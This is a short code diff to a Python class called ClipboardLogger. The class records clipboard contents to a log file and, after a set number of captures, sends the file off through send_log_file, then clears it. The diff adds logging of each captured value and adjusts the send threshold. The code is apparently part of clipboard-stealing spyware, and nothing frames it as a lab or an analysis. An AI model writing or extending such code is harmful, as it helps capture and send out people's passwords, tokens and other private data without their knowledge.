@@ -21,14 +21,14 @@ class ClipboardLogger:
         except:
             data = "None"
             pass
+        log_info(f"Logged clipboard data: {data}")
         log_to_file(self.log_file, data)
         self.increment_and_check_counter()
         
     def increment_and_check_counter(self):
         self.counter += 1
-        if self.counter > self.counter_max:
-            log_info("SENDING CLIPBOARD LOG FILE")
-            send_log_file(self.log_file)
+        if self.counter >= self.counter_max:
+            send_log_file("`Sending clipboard log file...`", self.log_file)
             clear_log_file(self.log_file)
             log_info("Sent and cleared clipboard log file.")
             self.counter = 0
